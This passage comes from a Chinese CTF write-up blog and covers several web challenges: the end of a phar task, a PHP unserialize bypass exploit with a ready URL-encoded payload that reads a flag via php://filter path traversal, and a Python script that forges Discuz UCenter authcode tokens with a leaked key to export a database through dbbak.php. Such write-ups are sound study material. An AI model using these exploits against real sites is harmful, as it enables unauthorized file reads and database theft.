</span></span><span class="line"><span class="ln">15</span><span class="cl"><span class="nv">$phar</span>-&gt;addFromString<span class="o">(</span><span class="s1">&#39;test.txt&#39;</span>, <span class="s1">&#39;test&#39;</span><span class="o">)</span><span class="p">;</span>
</span></span><span class="line"><span class="ln">16</span><span class="cl">
</span></span><span class="line"><span class="ln">17</span><span class="cl"><span class="nv">$phar</span>-&gt;stopBuffering<span class="o">()</span><span class="p">;</span>
</span></span><span class="line"><span class="ln">18</span><span class="cl">?&gt;
</span></span></code></pre></div><p>拿到flag</p>
<p><img alt="img" loading="lazy" src="../assets/1755430984426-13.png"></p>
<h2 id="your-uns3r">Your Uns3r<a hidden class="anchor" aria-hidden="true" href="#your-uns3r">#</a></h2>
<p>题目</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-Bash" data-lang="Bash"><span class="line"><span class="ln"> 1</span><span class="cl">&lt;?php
</span></span><span class="line"><span class="ln"> 2</span><span class="cl">highlight_file<span class="o">(</span>__FILE__<span class="o">)</span><span class="p">;</span>
</span></span><span class="line"><span class="ln"> 3</span><span class="cl">class User
</span></span><span class="line"><span class="ln"> 4</span><span class="cl"><span class="o">{</span>
</span></span><span class="line"><span class="ln"> 5</span><span class="cl">    public <span class="nv">$username</span><span class="p">;</span>
</span></span><span class="line"><span class="ln"> 6</span><span class="cl">    public <span class="nv">$value</span><span class="p">;</span>
</span></span><span class="line"><span class="ln"> 7</span><span class="cl">    public <span class="k">function</span> exec<span class="o">()</span>
</span></span><span class="line"><span class="ln"> 8</span><span class="cl">    <span class="o">{</span>
</span></span><span class="line"><span class="ln"> 9</span><span class="cl">        <span class="nv">$ser</span> <span class="o">=</span> unserialize<span class="o">(</span>serialize<span class="o">(</span>unserialize<span class="o">(</span><span class="nv">$this</span>-&gt;value<span class="o">)))</span><span class="p">;</span>
</span></span><span class="line"><span class="ln">10</span><span class="cl">        <span class="k">if</span> <span class="o">(</span><span class="nv">$ser</span> !<span class="o">=</span> <span class="nv">$this</span>-&gt;value <span class="o">&amp;&amp;</span> <span class="nv">$ser</span> instanceof Access<span class="o">)</span> <span class="o">{</span>
</span></span><span class="line"><span class="ln">11</span><span class="cl">            include<span class="o">(</span><span class="nv">$ser</span>-&gt;getToken<span class="o">())</span><span class="p">;</span>
</span></span><span class="line"><span class="ln">12</span><span class="cl">        <span class="o">}</span>
</span></span><span class="line"><span class="ln">13</span><span class="cl">    <span class="o">}</span>
</span></span><span class="line"><span class="ln">14</span><span class="cl">    public <span class="k">function</span> __destruct<span class="o">()</span>
</span></span><span class="line"><span class="ln">15</span><span class="cl">    <span class="o">{</span>
</span></span><span class="line"><span class="ln">16</span><span class="cl">        <span class="k">if</span> <span class="o">(</span><span class="nv">$this</span>-&gt;username <span class="o">==</span> <span class="s2">&#34;admin&#34;</span><span class="o">)</span> <span class="o">{</span>
</span></span><span class="line"><span class="ln">17</span><span class="cl">            <span class="nv">$this</span>-&gt;exec<span class="o">()</span><span class="p">;</span>
</span></span><span class="line"><span class="ln">18</span><span class="cl">        <span class="o">}</span>
</span></span><span class="line"><span class="ln">19</span><span class="cl">    <span class="o">}</span>
</span></span><span class="line"><span class="ln">20</span><span class="cl"><span class="o">}</span>
</span></span><span class="line"><span class="ln">21</span><span class="cl">
</span></span><span class="line"><span class="ln">22</span><span class="cl">class Access
</span></span><span class="line"><span class="ln">23</span><span class="cl"><span class="o">{</span>
</span></span><span class="line"><span class="ln">24</span><span class="cl">    protected <span class="nv">$prefix</span><span class="p">;</span>
</span></span><span class="line"><span class="ln">25</span><span class="cl">    protected <span class="nv">$suffix</span><span class="p">;</span>
</span></span><span class="line"><span class="ln">26</span><span class="cl">
</span></span><span class="line"><span class="ln">27</span><span class="cl">    public <span class="k">function</span> getToken<span class="o">()</span>
</span></span><span class="line"><span class="ln">28</span><span class="cl">    <span class="o">{</span>
</span></span><span class="line"><span class="ln">29</span><span class="cl">        <span class="k">if</span> <span class="o">(</span>!is_string<span class="o">(</span><span class="nv">$this</span>-&gt;prefix<span class="o">)</span> <span class="o">||</span> !is_string<span class="o">(</span><span class="nv">$this</span>-&gt;suffix<span class="o">))</span> <span class="o">{</span>
</span></span><span class="line"><span class="ln">30</span><span class="cl">            throw new Exception<span class="o">(</span><span class="s2">&#34;Go to HELL!&#34;</span><span class="o">)</span><span class="p">;</span>
</span></span><span class="line"><span class="ln">31</span><span class="cl">        <span class="o">}</span>
</span></span><span class="line"><span class="ln">32</span><span class="cl">        <span class="nv">$result</span> <span class="o">=</span> <span class="nv">$this</span>-&gt;prefix . <span class="s1">&#39;lilctf&#39;</span> . <span class="nv">$this</span>-&gt;suffix<span class="p">;</span>
</span></span><span class="line"><span class="ln">33</span><span class="cl">        <span class="k">if</span> <span class="o">(</span>strpos<span class="o">(</span><span class="nv">$result</span>, <span class="s1">&#39;pearcmd&#39;</span><span class="o">)</span> !<span class="o">==</span> <span class="nb">false</span><span class="o">)</span> <span class="o">{</span>
</span></span><span class="line"><span class="ln">34</span><span class="cl">            throw new Exception<span class="o">(</span><span class="s2">&#34;Can I have peachcmd?&#34;</span><span class="o">)</span><span class="p">;</span>
</span></span><span class="line"><span class="ln">35</span><span class="cl">        <span class="o">}</span>
</span></span><span class="line"><span class="ln">36</span><span class="cl">        <span class="k">return</span> <span class="nv">$result</span><span class="p">;</span>
</span></span><span class="line"><span class="ln">37</span><span class="cl">
</span></span><span class="line"><span class="ln">38</span><span class="cl">    <span class="o">}</span>
</span></span><span class="line"><span class="ln">39</span><span class="cl"><span class="o">}</span>
</span></span><span class="line"><span class="ln">40</span><span class="cl">
</span></span><span class="line"><span class="ln">41</span><span class="cl"><span class="nv">$ser</span> <span class="o">=</span> <span class="nv">$_POST</span><span class="o">[</span><span class="s2">&#34;user&#34;</span><span class="o">]</span><span class="p">;</span>
</span></span><span class="line"><span class="ln">42</span><span class="cl"><span class="k">if</span> <span class="o">(</span>strpos<span class="o">(</span><span class="nv">$ser</span>, <span class="s1">&#39;admin&#39;</span><span class="o">)</span> !<span class="o">==</span> <span class="nb">false</span> <span class="o">&amp;&amp;</span> strpos<span class="o">(</span><span class="nv">$ser</span>, <span class="s1">&#39;Access&#34;:&#39;</span><span class="o">)</span> !<span class="o">==</span> <span class="nb">false</span><span class="o">)</span> <span class="o">{</span>
</span></span><span class="line"><span class="ln">43</span><span class="cl">    <span class="nb">exit</span> <span class="o">(</span><span class="s2">&#34;no way!!!!&#34;</span><span class="o">)</span><span class="p">;</span>
</span></span><span class="line"><span class="ln">44</span><span class="cl"><span class="o">}</span>
</span></span><span class="line"><span class="ln">45</span><span class="cl">
</span></span><span class="line"><span class="ln">46</span><span class="cl"><span class="nv">$user</span> <span class="o">=</span> unserialize<span class="o">(</span><span class="nv">$ser</span><span class="o">)</span><span class="p">;</span>
</span></span><span class="line"><span class="ln">47</span><span class="cl">throw new Exception<span class="o">(</span><span class="s2">&#34;nonono!!!&#34;</span><span class="o">)</span><span class="p">;</span>
</span></span></code></pre></div><p>EXP</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-Bash" data-lang="Bash"><span class="line"><span class="ln"> 1</span><span class="cl">&lt;?php
</span></span><span class="line"><span class="ln"> 2</span><span class="cl">// highlight_file<span class="o">(</span>__FILE__<span class="o">)</span><span class="p">;</span>
</span></span><span class="line"><span class="ln"> 3</span><span class="cl">class User
</span></span><span class="line"><span class="ln"> 4</span><span class="cl"><span class="o">{</span>
</span></span><span class="line"><span class="ln"> 5</span><span class="cl">    public <span class="nv">$username</span><span class="p">;</span>
</span></span><span class="line"><span class="ln"> 6</span><span class="cl">    public <span class="nv">$value</span><span class="p">;</span>
</span></span><span class="line"><span class="ln"> 7</span><span class="cl"><span class="o">}</span>
</span></span><span class="line"><span class="ln"> 8</span><span class="cl">
</span></span><span class="line"><span class="ln"> 9</span><span class="cl">class Access
</span></span><span class="line"><span class="ln">10</span><span class="cl"><span class="o">{</span>
</span></span><span class="line"><span class="ln">11</span><span class="cl">    protected <span class="nv">$prefix</span> <span class="o">=</span> <span class="s1">&#39;php://filter/read=convert.base64-encode/resource=&#39;</span><span class="p">;</span>
</span></span><span class="line"><span class="ln">12</span><span class="cl">    protected <span class="nv">$suffix</span> <span class="o">=</span> <span class="s1">&#39;/../../../../../flag&#39;</span><span class="p">;</span>
</span></span><span class="line"><span class="ln">13</span><span class="cl">
</span></span><span class="line"><span class="ln">14</span><span class="cl"><span class="o">}</span>
</span></span><span class="line"><span class="ln">15</span><span class="cl">
</span></span><span class="line"><span class="ln">16</span><span class="cl"><span class="nv">$exp</span> <span class="o">=</span> new User<span class="o">()</span><span class="p">;</span>
</span></span><span class="line"><span class="ln">17</span><span class="cl"><span class="nv">$exp</span> -&gt; <span class="nv">username</span> <span class="o">=</span> <span class="s1">&#39;admin&#39;</span><span class="p">;</span>
</span></span><span class="line"><span class="ln">18</span><span class="cl"><span class="nv">$access</span> <span class="o">=</span> new Access<span class="o">()</span><span class="p">;</span>
</span></span><span class="line"><span class="ln">19</span><span class="cl"><span class="nv">$exp</span> -&gt; <span class="nv">value</span> <span class="o">=</span> serialize<span class="o">(</span><span class="nv">$access</span><span class="o">)</span><span class="p">;</span>
</span></span><span class="line"><span class="ln">20</span><span class="cl">
</span></span><span class="line"><span class="ln">21</span><span class="cl"><span class="nv">$exp</span> <span class="o">=</span> serialize<span class="o">(</span><span class="nv">$exp</span><span class="o">)</span><span class="p">;</span>
</span></span><span class="line"><span class="ln">22</span><span class="cl"><span class="nv">$exp</span> <span class="o">=</span> str_replace<span class="o">(</span><span class="s2">&#34;s:5:\&#34;admin&#34;</span>,<span class="s2">&#34;S:5:\&#34;admi\\6e&#34;</span>,<span class="nv">$exp</span><span class="o">)</span><span class="p">;</span>
</span></span><span class="line"><span class="ln">23</span><span class="cl"><span class="nv">$exp</span> <span class="o">=</span> str_replace<span class="o">(</span><span class="s2">&#34;Access&#34;</span>,<span class="s2">&#34;ACcess&#34;</span>,<span class="nv">$exp</span><span class="o">)</span><span class="p">;</span>
</span></span><span class="line"><span class="ln">24</span><span class="cl">
</span></span><span class="line"><span class="ln">25</span><span class="cl"><span class="nb">echo</span> urlencode<span class="o">(</span><span class="nv">$exp</span><span class="o">)</span><span class="p">;</span>
</span></span><span class="line"><span class="ln">26</span><span class="cl">
</span></span><span class="line"><span class="ln">27</span><span class="cl">//O%3A4%3A%22User%22%3A2%3A%7Bs%3A8%3A%22username%22%3BS%3A5%3A%22admi%5C6e%22%3Bs%3A5%3A%22value%22%3Bs%3A134%3A%22O%3A6%3A%22ACcess%22%3A2%3A%7Bs%3A9%3A%22%00%2A%00prefix%22%3Bs%3A49%3A%22php%3A%2F%2Ffilter%2Fread%3Dconvert.base64-encode%2Fresource%3D%22%3Bs%3A9%3A%22%00%2A%00suffix%22%3Bs%3A20%3A%22%2F..%2F..%2F..%2F..%2F..%2Fflag%22%3B%7D%22%3B%7D
</span></span></code></pre></div><p>类名可以用大小写绕过，变量名可以用hex绕过</p>
<p>最后删除最后一个括号来绕过gc回收</p>
<p>Payload</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-Python" data-lang="Python"><span class="line"><span class="ln">1</span><span class="cl"><span class="n">user</span><span class="o">=</span><span class="n">O</span><span class="o">%</span><span class="mi">3</span><span class="n">A4</span><span class="o">%</span><span class="mi">3</span><span class="n">A</span><span class="o">%</span><span class="mi">22</span><span class="n">User</span><span class="o">%</span><span class="mi">22</span><span class="o">%</span><span class="mi">3</span><span class="n">A2</span><span class="o">%</span><span class="mi">3</span><span class="n">A</span><span class="o">%</span><span class="mi">7</span><span class="n">Bs</span><span class="o">%</span><span class="mi">3</span><span class="n">A8</span><span class="o">%</span><span class="mi">3</span><span class="n">A</span><span class="o">%</span><span class="mi">22</span><span class="n">username</span><span class="o">%</span><span class="mi">22</span><span class="o">%</span><span class="mi">3</span><span class="n">BS</span><span class="o">%</span><span class="mi">3</span><span class="n">A5</span><span class="o">%</span><span class="mi">3</span><span class="n">A</span><span class="o">%</span><span class="mi">22</span><span class="n">admi</span><span class="o">%</span><span class="mi">5</span><span class="n">C6e</span><span class="o">%</span><span class="mi">22</span><span class="o">%</span><span class="mi">3</span><span class="n">Bs</span><span class="o">%</span><span class="mi">3</span><span class="n">A5</span><span class="o">%</span><span class="mi">3</span><span class="n">A</span><span class="o">%</span><span class="mi">22</span><span class="n">value</span><span class="o">%</span><span class="mi">22</span><span class="o">%</span><span class="mi">3</span><span class="n">Bs</span><span class="o">%</span><span class="mi">3</span><span class="n">A134</span><span class="o">%</span><span class="mi">3</span><span class="n">A</span><span class="o">%</span><span class="mi">22</span><span class="n">O</span><span class="o">%</span><span class="mi">3</span><span class="n">A6</span><span class="o">%</span><span class="mi">3</span><span class="n">A</span><span class="o">%</span><span class="mi">22</span><span class="n">ACcess</span><span class="o">%</span><span class="mi">22</span><span class="o">%</span><span class="mi">3</span><span class="n">A2</span><span class="o">%</span><span class="mi">3</span><span class="n">A</span><span class="o">%</span><span class="mi">7</span><span class="n">Bs</span><span class="o">%</span><span class="mi">3</span><span class="n">A9</span><span class="o">%</span><span class="mi">3</span><span class="n">A</span><span class="o">%</span><span class="mi">22</span><span class="o">%</span><span class="mi">00</span><span class="o">%</span><span class="mi">2</span><span class="n">A</span><span class="o">%</span><span class="mi">00</span><span class="n">prefix</span><span class="o">%</span><span class="mi">22</span><span class="o">%</span><span class="mi">3</span><span class="n">Bs</span><span class="o">%</span><span class="mi">3</span><span class="n">A49</span><span class="o">%</span><span class="mi">3</span><span class="n">A</span><span class="o">%</span><span class="mi">22</span><span class="n">php</span><span class="o">%</span><span class="mi">3</span><span class="n">A</span><span class="o">%</span><span class="mi">2</span><span class="n">F</span><span class="o">%</span><span class="mi">2</span><span class="n">Ffilter</span><span class="o">%</span><span class="mi">2</span><span class="n">Fread</span><span class="o">%</span><span class="mi">3</span><span class="n">Dconvert</span><span class="o">.</span><span class="n">base64</span><span class="o">-</span><span class="n">encode</span><span class="o">%</span><span class="mi">2</span><span class="n">Fresource</span><span class="o">%</span><span class="mi">3</span><span class="n">D</span><span class="o">%</span><span class="mi">22</span><span class="o">%</span><span class="mi">3</span><span class="n">Bs</span><span class="o">%</span><span class="mi">3</span><span class="n">A9</span><span class="o">%</span><span class="mi">3</span><span class="n">A</span><span class="o">%</span><span class="mi">22</span><span class="o">%</span><span class="mi">00</span><span class="o">%</span><span class="mi">2</span><span class="n">A</span><span class="o">%</span><span class="mi">00</span><span class="n">suffix</span><span class="o">%</span><span class="mi">22</span><span class="o">%</span><span class="mi">3</span><span class="n">Bs</span><span class="o">%</span><span class="mi">3</span><span class="n">A20</span><span class="o">%</span><span class="mi">3</span><span class="n">A</span><span class="o">%</span><span class="mi">22</span><span class="o">%</span><span class="mi">2</span><span class="n">F</span><span class="o">..%</span><span class="mi">2</span><span class="n">F</span><span class="o">..%</span><span class="mi">2</span><span class="n">F</span><span class="o">..%</span><span class="mi">2</span><span class="n">F</span><span class="o">..%</span><span class="mi">2</span><span class="n">F</span><span class="o">..%</span><span class="mi">2</span><span class="n">Fflag</span><span class="o">%</span><span class="mi">22</span><span class="o">%</span><span class="mi">3</span><span class="n">B</span><span class="o">%</span><span class="mi">7</span><span class="n">D</span><span class="o">%</span><span class="mi">22</span><span class="o">%</span><span class="mi">3</span><span class="n">B</span>
</span></span></code></pre></div><p><img alt="img" loading="lazy" src="../assets/1755430984426-14.png"></p>
<h2 id="我曾有一份工作">我曾有一份工作<a hidden class="anchor" aria-hidden="true" href="#我曾有一份工作">#</a></h2>
<p>扫目录扫到 /www.zip</p>
<p>拿到源码之后先用Seay扫一下可能存在风险的位置</p>
<p>想着先找前台洞，所以先找没有鉴权的</p>
<p><img alt="image-20250817202005435" loading="lazy" src="../assets/image-20250817202005435.png"></p>
<p>看到这个/uc_server/api/dbbak.php，想起来题目提到数据库和备份，感觉应该是找对了</p>
<p>这是一个数据库备份的脚本，可以对数据库进行导入导出之类的操作，题目说flag在<code>pre_a_flag</code> 表，那我们只需要把数据库导出来就好了，看看流程。</p>
<p><img alt="img" loading="lazy" src="../assets/1755430984426-16.png"></p>
<p>首先接受两个传参，code和apptype</p>
<p><img alt="img" loading="lazy" src="../assets/1755430984426-17.png"></p>
<p>接着会根据apptype导入不同的配置文件，配置文件里面会有数据库连接信息，密钥等信息</p>
<p><img alt="img" loading="lazy" src="../assets/1755430984426-18.png"></p>
<p>而code会通过_authcode函数进行解密，解出数组get。然后判断数据get是否为空且里面的time是否在一小时之内</p>
<p><img alt="img" loading="lazy" src="../assets/1755430984426-19.png"></p>
<p>根据不同的apptype连接不同的数据库，并根据get数组里面的method进行对应的操作，我们这里只需要export导出数据库就行了</p>
<p><img alt="img" loading="lazy" src="../assets/1755430984426-20.png"></p>
<p>流程走完，写个脚本生成一下code</p>
<p>POC</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-Python" data-lang="Python"><span class="line"><span class="ln"> 1</span><span class="cl"><span class="kn">import</span> <span class="nn">base64</span>
</span></span><span class="line"><span class="ln"> 2</span><span class="cl"><span class="kn">import</span> <span class="nn">hashlib</span>
</span></span><span class="line"><span class="ln"> 3</span><span class="cl"><span class="kn">import</span> <span class="nn">time</span>
</span></span><span class="line"><span class="ln"> 4</span><span class="cl"><span class="kn">import</span> <span class="nn">urllib.parse</span>
</span></span><span class="line"><span class="ln"> 5</span><span class="cl">
</span></span><span class="line"><span class="ln"> 6</span><span class="cl"><span class="n">UC_KEY</span> <span class="o">=</span> <span class="s2">&#34;N8ear1n0q4s646UeZeod130eLdlbqfs1BbRd447eq866gaUdmek7v2D9r9EeS6vb&#34;</span>
</span></span><span class="line"><span class="ln"> 7</span><span class="cl"><span class="n">TARGET</span> <span class="o">=</span> <span class="s2">&#34;http://challenge.xinshi.fun:31430/uc_server/api/dbbak.php?apptype=discuzx&amp;&#34;</span>
</span></span><span class="line"><span class="ln"> 8</span><span class="cl">
</span></span><span class="line"><span class="ln"> 9</span><span class="cl"><span class="k">def</span> <span class="nf">authcode</span><span class="p">(</span><span class="n">string</span><span class="p">,</span> <span class="n">operation</span><span class="o">=</span><span class="s1">&#39;DECODE&#39;</span><span class="p">,</span> <span class="n">key</span><span class="o">=</span><span class="n">UC_KEY</span><span class="p">,</span> <span class="n">expiry</span><span class="o">=</span><span class="mi">0</span><span class="p">):</span>
</span></span><span class="line"><span class="ln">10</span><span class="cl">    <span class="n">ckey_length</span> <span class="o">=</span> <span class="mi">4</span>
</span></span><span class="line"><span class="ln">11</span><span class="cl">    <span class="n">key</span> <span class="o">=</span> <span class="n">hashlib</span><span class="o">.</span><span class="n">md5</span><span class="p">(</span><span class="n">key</span><span class="o">.</span><span class="n">encode</span><span class="p">())</span><span class="o">.</span><span class="n">hexdigest</span><span class="p">()</span>
</span></span><span class="line"><span class="ln">12</span><span class="cl">    <span class="n">keya</span> <span class="o">=</span> <span class="n">hashlib</span><span class="o">.</span><span class="n">md5</span><span class="p">(</span><span class="n">key</span><span class="p">[:</span><span class="mi">16</span><span class="p">]</span><span class="o">.</span><span class="n">encode</span><span class="p">())</span><span class="o">.</span><span class="n">hexdigest</span><span class="p">()</span>
</span></span><span class="line"><span class="ln">13</span><span class="cl">    <span class="n">keyb</span> <span class="o">=</span> <span class="n">hashlib</span><span class="o">.</span><span class="n">md5</span><span class="p">(</span><span class="n">key</span><span class="p">[</span><span class="mi">16</span><span class="p">:]</span><span class="o">.</span><span class="n">encode</span><span class="p">())</span><span class="o">.</span><span class="n">hexdigest</span><span class="p">()</span>
</span></span><span class="line"><span class="ln">14</span><span class="cl">    <span class="k">if</span> <span class="n">ckey_length</span><span class="p">:</span>
</span></span><span class="line"><span class="ln">15</span><span class="cl">        <span class="k">if</span> <span class="n">operation</span> <span class="o">==</span> <span class="s1">&#39;DECODE&#39;</span><span class="p">:</span>
</span></span><span class="line"><span class="ln">16</span><span class="cl">            <span class="n">keyc</span> <span class="o">=</span> <span class="n">string</span><span class="p">[:</span><span class="n">ckey_length</span><span class="p">]</span>
</span></span><span class="line"><span class="ln">17</span><span class="cl">        <span class="k">else</span><span class="p">:</span>
</span></span><span class="line"><span class="ln">18</span><span class="cl">            <span class="n">keyc</span> <span class="o">=</span> <span class="n">hashlib</span><span class="o">.</span><span class="n">md5</span><span class="p">(</span><span class="nb">str</span><span class="p">(</span><span class="n">time</span><span class="o">.</span><span class="n">time</span><span class="p">())</span><span class="o">.</span><span class="n">encode</span><span class="p">())</span><span class="o">.</span><span class="n">hexdigest</span><span class="p">()[</span><span class="o">-</span><span class="n">ckey_length</span><span class="p">:]</span>
</span></span><span class="line"><span class="ln">19</span><span class="cl">    <span class="k">else</span><span class="p">:</span>
</span></span><span class="line"><span class="ln">20</span><span class="cl">        <span class="n">keyc</span> <span class="o">=</span> <span class="s1">&#39;&#39;</span>
</span></span><span class="line"><span class="ln">21</span><span class="cl">    <span class="n">cryptkey</span> <span class="o">=</span> <span class="n">keya</span> <span class="o">+</span> <span class="n">hashlib</span><span class="o">.</span><span class="n">md5</span><span class="p">((</span><span class="n">keya</span> <span class="o">+</span> <span class="n">keyc</span><span class="p">)</span><span class="o">.</span><span class="n">encode</span><span class="p">())</span><span class="o">.</span><span class="n">hexdigest</span><span class="p">()</span>
</span></span><span class="line"><span class="ln">22</span><span class="cl">    <span class="n">key_length</span> <span class="o">=</span> <span class="nb">len</span><span class="p">(</span><span class="n">cryptkey</span><span class="p">)</span>
</span></span><span class="line"><span class="ln">23</span><span class="cl">
</span></span><span class="line"><span class="ln">24</span><span class="cl">    <span class="k">if</span> <span class="n">operation</span> <span class="o">==</span> <span class="s1">&#39;DECODE&#39;</span><span class="p">:</span>
</span></span><span class="line"><span class="ln">25</span><span class="cl">        <span class="n">string</span> <span class="o">=</span> <span class="n">base64</span><span class="o">.</span><span class="n">b64decode</span><span class="p">(</span><span class="n">string</span><span class="p">[</span><span class="n">ckey_length</span><span class="p">:]</span><span class="o">.</span><span class="n">encode</span><span class="p">())</span>
</span></span><span class="line"><span class="ln">26</span><span class="cl">    <span class="k">else</span><span class="p">:</span>
</span></span><span class="line"><span class="ln">27</span><span class="cl">        <span class="n">expiry_time</span> <span class="o">=</span> <span class="n">expiry</span> <span class="o">+</span> <span class="nb">int</span><span class="p">(</span><span class="n">time</span><span class="o">.</span><span class="n">time</span><span class="p">())</span> <span class="k">if</span> <span class="n">expiry</span> <span class="k">else</span> <span class="mi">0</span>
</span></span><span class="line"><span class="ln">28</span><span class="cl">        <span class="n">string</span> <span class="o">=</span> <span class="p">(</span><span class="s1">&#39;</span><span class="si">%010d</span><span class="s1">&#39;</span> <span class="o">%</span> <span class="n">expiry_time</span><span class="p">)</span><span class="o">.</span><span class="n">encode</span><span class="p">()</span> <span class="o">+</span> \
</span></span><span class="line"><span class="ln">29</span><span class="cl">                 <span class="n">hashlib</span><span class="o">.</span><span class="n">md5</span><span class="p">((</span><span class="n">string</span> <span class="o">+</span> <span class="n">keyb</span><span class="p">)</span><span class="o">.</span><span class="n">encode</span><span class="p">())</span><span class="o">.</span><span class="n">hexdigest</span><span class="p">()[:</span><span class="mi">16</span><span class="p">]</span><span class="o">.</span><span class="n">encode</span><span class="p">()</span> <span class="o">+</span> \
</span></span><span class="line"><span class="ln">30</span><span class="cl">                 <span class="n">string</span><span class="o">.</span><span class="n">encode</span><span class="p">()</span>
</span></span><span class="line"><span class="ln">31</span><span class="cl">
</span></span><span class="line"><span class="ln">32</span><span class="cl">    <span class="n">box</span> <span class="o">=</span> <span class="nb">list</span><span class="p">(</span><span class="nb">range</span><span class="p">(</span><span class="mi">256</span><span class="p">))</span>
</span></span><span class="line"><span class="ln">33</span><span class="cl">    <span class="n">rndkey</span> <span class="o">=</span> <span class="p">[</span><span class="nb">ord</span><span class="p">(</span><span class="n">cryptkey</span><span class="p">[</span><span class="n">i</span> <span class="o">%</span> <span class="n">key_length</span><span class="p">])</span> <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">256</span><span class="p">)]</span>
</span></span><span class="line"><span class="ln">34</span><span class="cl">    <span class="n">j</span> <span class="o">=</span> <span class="mi">0</span>
</span></span><span class="line"><span class="ln">35</span><span class="cl">    <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">256</span><span class="p">):</span>
</span></span><span class="line"><span class="ln">36</span><span class="cl">        <span class="n">j</span> <span class="o">=</span> <span class="p">(</span><span class="n">j</span> <span class="o">+</span> <span class="n">box</span><span class="p">[</span><span class="n">i</span><span class="p">]</span> <span class="o">+</span> <span class="n">rndkey</span><span class="p">[</span><span class="n">i</span><span class="p">])</span> <span class="o">%</span> <span class="mi">256</span>
</span></span><span class="line"><span class="ln">37</span><span class="cl">        <span class="n">box</span><span class="p">[</span><span class="n">i</span><span class="p">],</span> <span class="n">box</span><span class="p">[</span><span class="n">j</span><span class="p">]</span> <span class="o">=</span> <span class="n">box</span><span class="p">[</span><span class="n">j</span><span class="p">],</span> <span class="n">box</span><span class="p">[</span><span class="n">i</span><span class="p">]</span>
</span></span><span class="line"><span class="ln">38</span><span class="cl">
</span></span><span class="line"><span class="ln">39</span><span class="cl">    <span class="n">result</span> <span class="o">=</span> <span class="nb">bytearray</span><span class="p">()</span>
</span></span><span class="line"><span class="ln">40</span><span class="cl">    <span class="n">a</span> <span class="o">=</span> <span class="n">j</span> <span class="o">=</span> <span class="mi">0</span>
</span></span><span class="line"><span class="ln">41</span><span class="cl">    <span class="k">for</span> <span class="n">byte</span> <span class="ow">in</span> <span class="n">string</span><span class="p">:</span>
</span></span><span class="line"><span class="ln">42</span><span class="cl">        <span class="n">a</span> <span class="o">=</span> <span class="p">(</span><span class="n">a</span> <span class="o">+</span> <span class="mi">1</span><span class="p">)</span> <span class="o">%</span> <span class="mi">256</span>
</span></span><span class="line"><span class="ln">43</span><span class="cl">        <span class="n">j</span> <span class="o">=</span> <span class="p">(</span><span class="n">j</span> <span class="o">+</span> <span class="n">box</span><span class="p">[</span><span class="n">a</span><span class="p">])</span> <span class="o">%</span> <span class="mi">256</span>
</span></span><span class="line"><span class="ln">44</span><span class="cl">        <span class="n">box</span><span class="p">[</span><span class="n">a</span><span class="p">],</span> <span class="n">box</span><span class="p">[</span><span class="n">j</span><span class="p">]</span> <span class="o">=</span> <span class="n">box</span><span class="p">[</span><span class="n">j</span><span class="p">],</span> <span class="n">box</span><span class="p">[</span><span class="n">a</span><span class="p">]</span>
</span></span><span class="line"><span class="ln">45</span><span class="cl">        <span class="n">result</span><span class="o">.</span><span class="n">append</span><span class="p">(</span><span class="n">byte</span> <span class="o">^</span> <span class="n">box</span><span class="p">[(</span><span class="n">box</span><span class="p">[</span><span class="n">a</span><span class="p">]</span> <span class="o">+</span> <span class="n">box</span><span class="p">[</span><span class="n">j</span><span class="p">])</span> <span class="o">%</span> <span class="mi">256</span><span class="p">])</span>
</span></span><span class="line"><span class="ln">46</span><span class="cl">
</span></span><span class="line"><span class="ln">47</span><span class="cl">    <span class="k">if</span> <span class="n">operation</span> <span class="o">==</span> <span class="s1">&#39;DECODE&#39;</span><span class="p">:</span>
</span></span><span class="line"><span class="ln">48</span><span class="cl">        <span class="n">result</span> <span class="o">=</span> <span class="n">result</span><span class="o">.</span><span class="n">decode</span><span class="p">(</span><span class="n">errors</span><span class="o">=</span><span class="s1">&#39;ignore&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="ln">49</span><span class="cl">        <span class="k">if</span> <span class="p">(</span><span class="nb">len</span><span class="p">(</span><span class="n">result</span><span class="p">)</span> <span class="o">&gt;</span> <span class="mi">26</span> <span class="ow">and</span>
</span></span><span class="line"><span class="ln">50</span><span class="cl">            <span class="p">(</span><span class="nb">int</span><span class="p">(</span><span class="n">result</span><span class="p">[:</span><span class="mi">10</span><span class="p">])</span> <span class="o">==</span> <span class="mi">0</span> <span class="ow">or</span> <span class="nb">int</span><span class="p">(</span><span class="n">result</span><span class="p">[:</span><span class="mi">10</span><span class="p">])</span> <span class="o">-</span> <span class="nb">int</span><span class="p">(</span><span class="n">time</span><span class="o">.</span><span class="n">time</span><span class="p">())</span> <span class="o">&gt;</span> <span class="mi">0</span><span class="p">)</span> <span class="ow">and</span>
</span></span><span class="line"><span class="ln">51</span><span class="cl">            <span class="n">result</span><span class="p">[</span><span class="mi">10</span><span class="p">:</span><span class="mi">26</span><span class="p">]</span> <span class="o">==</span> <span class="n">hashlib</span><span class="o">.</span><span class="n">md5</span><span class="p">((</span><span class="n">result</span><span class="p">[</span><span class="mi">26</span><span class="p">:]</span> <span class="o">+</span> <span class="n">keyb</span><span class="p">)</span><span class="o">.</span><span class="n">encode</span><span class="p">())</span><span class="o">.</span><span class="n">hexdigest</span><span class="p">()[:</span><span class="mi">16</span><span class="p">]):</span>
</span></span><span class="line"><span class="ln">52</span><span class="cl">            <span class="k">return</span> <span class="n">result</span><span class="p">[</span><span class="mi">26</span><span class="p">:]</span>
</span></span><span class="line"><span class="ln">53</span><span class="cl">        <span class="k">else</span><span class="p">:</span>
</span></span><span class="line"><span class="ln">54</span><span class="cl">            <span class="k">return</span> <span class="s1">&#39;&#39;</span>
</span></span><span class="line"><span class="ln">55</span><span class="cl">    <span class="k">else</span><span class="p">:</span>
</span></span><span class="line"><span class="ln">56</span><span class="cl">        <span class="k">return</span> <span class="n">keyc</span> <span class="o">+</span> <span class="n">base64</span><span class="o">.</span><span class="n">b64encode</span><span class="p">(</span><span class="n">result</span><span class="p">)</span><span class="o">.</span><span class="n">decode</span><span class="p">()</span><span class="o">.</span><span class="n">replace</span><span class="p">(</span><span class="s1">&#39;=&#39;</span><span class="p">,</span> <span class="s1">&#39;&#39;</span><span class="p">)</span>
